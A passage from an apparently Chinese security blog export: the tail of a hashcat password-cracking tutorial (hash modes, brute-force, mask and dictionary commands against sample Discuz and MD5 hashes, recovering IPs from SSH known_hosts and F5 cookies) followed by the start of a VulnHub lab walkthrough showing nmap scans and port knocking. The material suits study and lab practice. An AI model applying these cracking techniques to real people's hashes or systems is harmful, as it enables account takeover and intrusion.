class="line"></span><br><span class="line">  7100 = OS X v10.8+</span><br><span class="line"></span><br><span class="line">  7200 = GRUB 2</span><br><span class="line"></span><br><span class="line">  7300 = IPMI2 RAKP HMAC-SHA1</span><br><span class="line"></span><br><span class="line">  7400 = sha256crypt, SHA256(Unix)</span><br><span class="line"></span><br><span class="line">  7900 = Drupal7</span><br><span class="line"></span><br><span class="line">  8400 = WBB3, Woltlab Burning Board 3</span><br><span class="line"></span><br><span class="line">  8900 = scrypt</span><br><span class="line"></span><br><span class="line">  9200 = Cisco <span class="variable">$8</span>$</span><br><span class="line"></span><br><span class="line">  9300 = Cisco <span class="variable">$9</span>$</span><br><span class="line"></span><br><span class="line">  9800 = Radmin2</span><br><span class="line"></span><br><span class="line"> 10000 = Django (PBKDF2-SHA256)</span><br><span class="line"></span><br><span class="line"> 10200 = Cram MD5</span><br><span class="line"></span><br><span class="line"> 10300 = SAP CODVN H (PWDSALTEDHASH) iSSHA-1</span><br><span class="line"></span><br><span class="line"> 11000 = PrestaShop</span><br><span class="line"></span><br><span class="line"> 11100 = PostgreSQL Challenge-ResponseAuthentication (MD5)</span><br><span class="line"></span><br><span class="line"> 11200 = MySQL Challenge-Response Authentication(SHA1)</span><br><span class="line"></span><br><span class="line"> 11400 = SIP digest authentication (MD5)</span><br><span class="line"></span><br><span class="line"> 99999 = Plaintext</span><br><span class="line"></span><br><span class="line">特殊哈希类型</span><br><span class="line"></span><br><span class="line">   11 = Joomla &lt; 2.5.18</span><br><span class="line"></span><br><span class="line">   12 = PostgreSQL</span><br><span class="line"></span><br><span class="line">   21 = osCommerce, xt:Commerce</span><br><span class="line"></span><br><span class="line">   23 = Skype</span><br><span class="line"></span><br><span class="line">  101 = nsldap, SHA-1(Base64), Netscape LDAPSHA</span><br><span class="line"></span><br><span class="line">  111 = nsldaps, SSHA-1(Base64), Netscape LDAPSSHA</span><br><span class="line"></span><br><span class="line">  112 = Oracle S: Type (Oracle 11+)</span><br><span class="line"></span><br><span class="line">  121 = SMF &gt; v1.1</span><br><span class="line"></span><br><span class="line">  122 = OS X v10.4, v10.5, v10.6</span><br><span class="line"></span><br><span class="line">  123 = EPi</span><br><span class="line"></span><br><span class="line">  124 = Django (SHA-1)</span><br><span class="line"></span><br><span class="line">  131 = MSSQL(2000)</span><br><span class="line"></span><br><span class="line">  132 = MSSQL(2005)</span><br><span class="line"></span><br><span class="line">  133 = PeopleSoft</span><br><span class="line"></span><br><span class="line">  141 = EPiServer 6.x &lt; v4</span><br><span class="line"></span><br><span class="line"> 1421 = hMailServer</span><br><span class="line"></span><br><span class="line"> 1441 = EPiServer 6.x &gt; v4</span><br><span class="line"></span><br><span class="line"> 1711 = SSHA-512(Base64), LDAP &#123;SSHA512&#125;</span><br><span class="line"></span><br><span class="line"> 1722 = OS X v10.7</span><br><span class="line"></span><br><span class="line"> 1731 = MSSQL(2012 &amp; 2014)</span><br><span class="line"></span><br><span class="line"> 2611 = vBulletin &lt; v3.8.5</span><br><span class="line"></span><br><span class="line"> 2612 = PHPS</span><br><span class="line"></span><br><span class="line"> 2711 = vBulletin &gt; v3.8.5</span><br><span class="line"></span><br><span class="line"> 2811 = IPB2+, MyBB1.2+</span><br><span class="line"></span><br><span class="line"> 3711 = Mediawiki B <span class="built_in">type</span></span><br><span class="line"></span><br><span class="line"> 3721 = WebEdition CMS</span><br><span class="line"></span><br><span class="line"> 7600 = Redmine Project Management Web App</span><br></pre></td></tr></table></figure>

<h3 id="第四步：hashcat破解密码规则示例"><a href="#第四步：hashcat破解密码规则示例" class="headerlink" title="第四步：hashcat破解密码规则示例"></a>第四步：hashcat破解密码规则示例</h3><p>(1)字典攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a 0 password.lst</span><br></pre></td></tr></table></figure>

<p>(2)1到8为数字掩码攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a 3 --increment --increment-min 1--increment-max 8 ?d?d?d?d?d?d?d?d –O</span><br></pre></td></tr></table></figure>
<p>?d代表数字，可以换成小写字母?l，大写字母?u，特殊字符?s，大小写字母+特殊字符?a，–O表示最优化破解模式，可以加该参数，也可以不加该参数。</p>
<p>(3)8为数字攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a 3 ?d?d?d?d?d?d?d?d </span><br></pre></td></tr></table></figure>
<p>同理可以根据位数设置为字母大写、小写、特殊字符等模式。</p>
<p>(4)自定义字符<br>现在纯数字或者纯字母的密码是比较少见的，根据密码专家对泄漏密码的分析，90%的个人密码是字母和数字的组合，可以是自定义字符了来进行暴力破解，Hashcat支持4个自定义字符集，分别是 -1 -2 -3 -4。定义时只需要这样-2  ?l?d ，然后就可以在后面指定?2，?2表示小写字母和数字。这时候要破解一个8位混合的小写字母加数字：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat.exe -a 3 –force -2 ?l?d  hassh值或者<span class="built_in">hash</span>文件  ?2?2?2?2?2?2?2?2</span><br></pre></td></tr></table></figure>
<p>例如破解dz小写字母+数字混合8位密码破解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat -m 2611  -a 3 -2 ?l?d  dz.hash    ?2?2?2?2?2?2?2?2</span><br></pre></td></tr></table></figure>

<p>(5)字典+掩码暴力破解<br>Hashcat还支持一种字典加暴力的破解方法，就是在字典前后再加上暴力的字符序列，比如在字典后面加上3为数字，这种密码是很常见的。使用第六种攻击模式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a-6 (Hybrid dict + mask)</span><br></pre></td></tr></table></figure>
<p>如果是在字典前面加则使用第7中攻击模式也即( a-7 = Hybridmask + dict)，下面对字典文件加数字123进行破解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">H.exe -a 6 ffe1cb31eb084cd7a8dd1228c23617c8  password.lst ?d?d?d</span><br></pre></td></tr></table></figure>
<p>假如ffe1cb31eb084cd7a8dd1228c23617c8的密码为password123，则只要password.lst包含123即可</p>
<p>(6)掩码+字典暴力破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">H.exe -a 7  ffe1cb31eb084cd7a8dd1228c23617c8  password.lst ?d?d?d</span><br></pre></td></tr></table></figure>
<p>假如ffe1cb31eb084cd7a8dd1228c23617c8的密码为123password，则只要password.lst包含password即可。</p>
<p>(7)大小写转换攻击，对password.lst中的单词进行大小写转换攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">H.exe<span class="_">-a</span> 2  ffe1cb31eb084cd7a8dd1228c23617c8  password.lst</span><br></pre></td></tr></table></figure>

<h4 id="EXAMPLES"><a href="#EXAMPLES" class="headerlink" title="EXAMPLES"></a>EXAMPLES</h4><p>(1)8位数字破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64-m 9700 <span class="built_in">hash</span> -a 3 ?d?d?d?d?d?d?d?d -w 3 –O</span><br></pre></td></tr></table></figure>
<p>(2)1-8位数字破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 --increment --increment-min 1--increment-max 8 ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<p>(3)1到8位小写字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 --increment --increment-min 1--increment-max 8 ?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure>
<p>(4)8位小写字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 ?l?l?l?l?l?l?l?l -w 3 –O</span><br></pre></td></tr></table></figure>
<p>(5)1-8位大写字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 --increment --increment-min 1--increment-max 8 ?u?u?u?u?u?u?u?u</span><br></pre></td></tr></table></figure>
<p>(6)8位大写字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 ?u?u?u?u?u?u?u?u -w 3 –O</span><br></pre></td></tr></table></figure>
<p>(7)5位小写+ 大写+数字+特殊字符破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat-m 9700 <span class="built_in">hash</span> -a 3 ?b?b?b?b?b -w 3</span><br></pre></td></tr></table></figure>
<p>(8)使用字典进行破解<br>使用password.lst字典进行暴力破解，-w 3参数是指定电力消耗</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat  -m 9700 -a 0 -w 3 <span class="built_in">hash</span>  password.lst</span><br></pre></td></tr></table></figure>

<p><font color="blue">在执行破解成功后，hashcat会自动终止破解，并显示破解状态为Cracked，Recvoered中也会显示是否破解成功.</font></p>
<h3 id="破解known-hosts中的IP地址"><a href="#破解known-hosts中的IP地址" class="headerlink" title="破解known_hosts中的IP地址"></a>破解known_hosts中的IP地址</h3><p>经过研究发现known_hosts中会对连接的IP地址进行HMAC SHA1加密，可以通过hexhosts攻击进行转换，然后通过hashcat进行暴力破解，其密码类型为160（HMAC-SHA1 (key = $salt)）。</p>
<p>(1)计算HMAC SHA1值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gitclone https://github.com/persona5/hexhosts.git</span><br><span class="line">cdhexhosts</span><br><span class="line">gcchexhosts.c -lresolv -w -o hexhosts</span><br><span class="line">./hexhosts</span><br></pre></td></tr></table></figure>
<p>获取known_hosts的HMAC SHA1加密值：</p>
<p>注意：known_hosts值一定要正确，可以将known_hosts文件复制到hexhosts文件目录。</p>
<p>(2)组合攻击暴力破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat<span class="_">-a</span> 1 -m 160 known_hosts.hash ips_left.txt ips_right.txt --hex-salt</span><br></pre></td></tr></table></figure>
<p>组合攻击是将ips_left.txt和ips_right.txt进行组合，形成完整的IP地址进行暴力破解。</p>
<p>ips_left.txt和ips_right.txt文件可以用以下代码进行生成：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip-gen.sh：</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> `seq 0 255`</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> `seq0 255`</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span><span class="string">&quot;<span class="variable">$a</span>.<span class="variable">$b</span>.&quot;</span> &gt;&gt; ips_left.txt</span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span><span class="string">&quot;<span class="variable">$a</span>.<span class="variable">$b</span>&quot;</span> &gt;&gt; ips_right.txt</span><br><span class="line"></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>(3)使用掩码进行攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat  -a 3 -m 160 known_hosts.hash ipv4.hcmask--hex-salt</span><br></pre></td></tr></table></figure>
<p>ipv4.hcmask文件内容可在<span class="exturl" data-url="aHR0cHM6Ly9wYXN0ZWJpbi5jb20vNEhRNkM4Z0c=">此站<i class="fa fa-external-link-alt"></i></span>下载。</p>
<h3 id="破解md5加密的IP地址"><a href="#破解md5加密的IP地址" class="headerlink" title="破解md5加密的IP地址"></a>破解md5加密的IP地址</h3><p>在CDN等网络或者配置中往往会对IP地址进行MD5加密，由于其位数3×4+3（xxx.xxx.xxx.xxx）=17位，通过正常的密码破解其时间耗费非常长，但通过分析其IP地址的规律，发现其地址XXX均为数字，因此可以通过hashcat的组合和掩码进行攻击。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat<span class="_">-a</span> 1 –m 0 ip.md5.txt ips_left.txt ips_right.txt </span><br><span class="line"></span><br><span class="line">hashcat  -a1 -m 0 ip.md5.txt ipv4.hcmask</span><br></pre></td></tr></table></figure>
<p>另外在F5的cookie中会对其IP地址进行加密，可以参考的破解代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&quot;1005421066.20736.0000&quot;</span></span><br><span class="line"></span><br><span class="line">(ip,port,end)=cookie.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">(a,b,c,d)=[ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> struct.pack(<span class="string">&quot;i&quot;</span>,int(ip))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Decoded IP: %s %s %s %s&quot;</span> % (a,b,c,d)</span><br><span class="line"></span><br><span class="line">Decoded IP: 10.130.237.59</span><br></pre></td></tr></table></figure>

<h4 id="破解技巧总结"><a href="#破解技巧总结" class="headerlink" title="破解技巧总结"></a>破解技巧总结</h4><p>在使用GPU模式进行破解时，可以使用-O参数自动进行优化</p>
<h3 id="暴力破解一条md5值"><a href="#暴力破解一条md5值" class="headerlink" title="暴力破解一条md5值"></a>暴力破解一条md5值</h3><p>(1)9位数字破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force d98d28ca88f9966cb3aaefebbfc8196f ?d?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<p>单独破解一条md5值需要加force参数</p>
<p>(2)9位字母破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force d98d28ca88f9966cb3aaefebbfc8196f ?l?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure>

<h3 id="破解带盐discuz密码"><a href="#破解带盐discuz密码" class="headerlink" title="破解带盐discuz密码"></a>破解带盐discuz密码</h3><p>(1)数字破解<br>7位数字，7秒时间破解完成任务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<p>8位数字破解，9秒时间破解完成任务。：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?d?d?d?d?d?d?d?d </span><br></pre></td></tr></table></figure>
<p>9位数字破解，9秒时间破解完成任务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?d?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>

<h3 id="字母破解"><a href="#字母破解" class="headerlink" title="字母破解"></a>字母破解</h3><p>(1)6位小写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?l?l?l?l?l?l </span><br></pre></td></tr></table></figure>
<p>(2)7位小写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?l?l?l?l?l?l?l </span><br></pre></td></tr></table></figure>
<p>(3)8位小写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?l?l?l?l?l?l?l?l 9分钟左右完成破解任务</span><br></pre></td></tr></table></figure>
<p>(4)9位小写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?l?l?l?l?l?l?l?l?l -O</span><br></pre></td></tr></table></figure>

<h3 id="字母加数字"><a href="#字母加数字" class="headerlink" title="字母加数字"></a>字母加数字</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 -2 ?d?l ffe1cb31eb084cd7a8dd1228c23617c8:f56463?2?2?2?2?2?2?2</span><br></pre></td></tr></table></figure>
<p>(3)7位大写字母</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 –force –m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 ?u?u?u?u?u?u?u</span><br></pre></td></tr></table></figure>
<p>(4)6到8位数字破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 –force –m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l </span><br></pre></td></tr></table></figure>

<h3 id="自定义破解"><a href="#自定义破解" class="headerlink" title="自定义破解"></a>自定义破解</h3><p>(1)使用数字加字母混合6位进行破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 -2 ?d?l ffe1cb31eb084cd7a8dd1228c23617c8:f56463?2?2?2?2?2?2 -O</span><br></pre></td></tr></table></figure>
<p>(2)使用数字加字母混合7位进行破解，破解时间4分16秒</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 -2 ?d?l ffe1cb31eb084cd7a8dd1228c23617c8:f56463?2?2?2?2?2?2?2 –O</span><br></pre></td></tr></table></figure>
<p>(3)使用数字加字母混合8位进行破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 3 --force -m 2611 -2 ?d?l ffe1cb31eb084cd7a8dd1228c23617c8:f56463?2?2?2?2?2?2?2?2 -O</span><br></pre></td></tr></table></figure>

<h3 id="字典破解模式"><a href="#字典破解模式" class="headerlink" title="字典破解模式"></a>字典破解模式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat64.exe<span class="_">-a</span> 0 --force -m 2611 ffe1cb31eb084cd7a8dd1228c23617c8:f56463 password.lst</span><br></pre></td></tr></table></figure>
<p>使用字典文件夹下的字典进行破解:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat32.exe-m 300 mysqlhashes.txt –remove -o mysql-cracked.txt ..\dictionaries\*</span><br></pre></td></tr></table></figure>

<h3 id="会话保存及恢复破解"><a href="#会话保存及恢复破解" class="headerlink" title="会话保存及恢复破解"></a>会话保存及恢复破解</h3><p>(1)使用mask文件规则来破解密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat-m 2611 -a 3 --session mydz dz.hash masks/rockyou-7-2592000.hcmask</span><br></pre></td></tr></table></figure>
<p>(2)恢复会话</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat--session mydz --restore</span><br></pre></td></tr></table></figure>

<h3 id="掩码破解"><a href="#掩码破解" class="headerlink" title="掩码破解"></a>掩码破解</h3><p>mask规则文件位于masks下，例如D:\PentestBox\hashcat-4.1.0\masks，执行破解设置为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">masks/8char-1l-1u-1d-1s-compliant.hcmask</span><br><span class="line">masks/8char-1l-1u-1d-1s-noncompliant.hcmask</span><br><span class="line">masks/rockyou-1-60.hcmask</span><br><span class="line">masks/rockyou-2-1800.hcmask</span><br><span class="line">masks/rockyou-3-3600.hcmask</span><br><span class="line">masks/rockyou-4-43200.hcmask</span><br><span class="line">masks/rockyou-5-86400.hcmask</span><br><span class="line">masks/rockyou-6-864000.hcmask</span><br><span class="line">masks/rockyou-7-2592000.hcmask</span><br></pre></td></tr></table></figure>
<p>运用规则文件进行破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hashcat -m 300 mysqlhashes.txt–remove -o mysql-cracked.txt ..\dictionaries\* -r rules\best64.rule</span><br><span class="line"></span><br><span class="line">hashcat -m 2611 -a 0 dz.hashpassword.lst  -r rules\best64.rule  -O</span><br></pre></td></tr></table></figure>

<h4 id="hashcat参数优化"><a href="#hashcat参数优化" class="headerlink" title="hashcat参数优化"></a>hashcat参数优化</h4><p><font color="blue">考虑到hashcat的破解速度以及资源的分配，我们可以对一些参数进行配置<br>1.Workload tuning 负载调优。<br>该参数支持的值有1,8,40,80,160</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--gpu-accel 160 可以让GPU发挥最大性能。</span><br></pre></td></tr></table></figure>

<p>2.Gpu loops 负载微调<br>该参数支持的值的范围是8-1024（有些算法只支持到1000）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--gpu-loops 1024 可以让GPU发挥最大性能。</span><br></pre></td></tr></table></figure>

<p>3.Segment size 字典缓存大小<br>该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为32MB，可以根据自身内存情况进行设置，当然是越大越块了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--segment-size 512 可以提高大字典破解的速度。</span><br></pre></td></tr></table></figure>
</font>

<h4 id="LAST-密码设置建议"><a href="#LAST-密码设置建议" class="headerlink" title="LAST:密码设置建议"></a>LAST:密码设置建议</h4><font color="red">
使用更长的字符串

<p>使用更大的字符集字母、数字、符号</p>
<p>不要使用任何可能与你有关的字符作为密码或密码的一部分使用<br></font></p>
]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>hashcat</tag>
        <tag>gpu</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Lord-Of-The-Root-1-0-1]</title>
    <url>/2020/01/24/Lord-Of-The-Root-1-0-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Lord Of The Root: 1.0.1<br>发行日期：2015年9月23日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2Rvd25sb2FkL201dGJ4MGR1YTA1c3pqbS9Mb3JkT2ZUaGVSb290Lm92YQ==">http://www.mediafire.com/download/m5tbx0dua05szjm/LordOfTheRoot.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sb3Jkb2Z0aGVyb290L0xvcmRPZlRoZVJvb3RfMS4wLjEub3Zh">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sb3Jkb2Z0aGVyb290L0xvcmRPZlRoZVJvb3RfMS4wLjEub3ZhLnRvcnJlbnQ=">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>创建这台机器是为了帮助其他人学习一些基本的CTF hack技巧和一些工具。这台机器的难度与我在OSCP上遇到的难度非常相似。这是一个引导到root的靶机，不需要任何来宾交互。有两种设计的权限提升方法。</p>
<ul>
<li>23/09/2015 == v1.0.1</li>
<li>22/09/2015 == v1.0</li>
</ul>
<a id="more"></a>

<p>如果您在使用VirtualBox时遇到问题，请尝试以下操作：</p>
<ul>
<li>下载LordOfTheRoot_1.0.1.ova（确认文件哈希）</li>
<li>下载并安装了VMWare ovftool。</li>
<li>使用ovftool将OVA转换为OVF。</li>
<li>使用文本编辑器修改了OVF，并执行以下操作：将所有对“ElementName”的引用替换为“标题”，将对“vmware.sata.ahci”的单个引用替换为“AHCI”</li>
<li>保存了OVF。+删除.mf（清单）文件。如果不这样做，则在导入时会出现错误，说SHA与OVF不匹配（尝试过修改哈希，但没有成功）。</li>
<li>尝试导入OVF文件，应该可以正常工作。</li>
</ul>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.113</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">MAC Address: 08:00:27:0B:D4:69 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span><br></pre></td></tr></table></figure>

<p>连接一下ssh试试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh 192.168.56.113</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.113 (192.168.56.113)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.113<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                  .____    _____________________________</span></span><br><span class="line"><span class="string">                                                  |    |   \_____  \__    ___/\______   \</span></span><br><span class="line"><span class="string">                                                  |    |    /   |   \|    |    |       _/</span></span><br><span class="line"><span class="string">                                                  |    |___/    |    \    |    |    |   \</span></span><br><span class="line"><span class="string">                                                  |_______ \_______  /____|    |____|_  /</span></span><br><span class="line"><span class="string">                                                          \/       \/                 \/</span></span><br><span class="line"><span class="string"> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __</span></span><br><span class="line"><span class="string">|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________</span></span><br><span class="line"><span class="string">|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \</span></span><br><span class="line"><span class="string">|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/</span></span><br><span class="line"><span class="string">|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|</span></span><br><span class="line"><span class="string">        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/</span></span><br><span class="line"><span class="string">Easy as 1,2,3</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">root@192.168.56.113&#x27;</span>s password:</span><br></pre></td></tr></table></figure>

<p>当搜索SSH时，它说<code>Knock Friend To Enter&#39;&#39;和</code>Easy as 123’’，然后要求输入我们不知道的密码。现在，这暗示着端口碰撞。试试看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -r -Pn -p 1,2,3 192.168.56.113 -v</span></span><br><span class="line">PORT  STATE    SERVICE</span><br><span class="line">1/tcp filtered tcpmux</span><br><span class="line">2/tcp filtered compressnet</span><br><span class="line">3/tcp filtered compressnet</span><br><span class="line">MAC Address: 08:00:27:0B:D4:69 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<p>现在再次启动nmap扫描。希望这次的结果中有多个端口。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -A -v 192.168.56.113 --min-rate=10000</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)</span><br><span class="line">|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)</span><br><span class="line">|   256 f3:<span class="built_in">cd</span>:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)</span><br><span class="line">|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)</span><br><span class="line">1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br></pre></td></tr></table></figure>

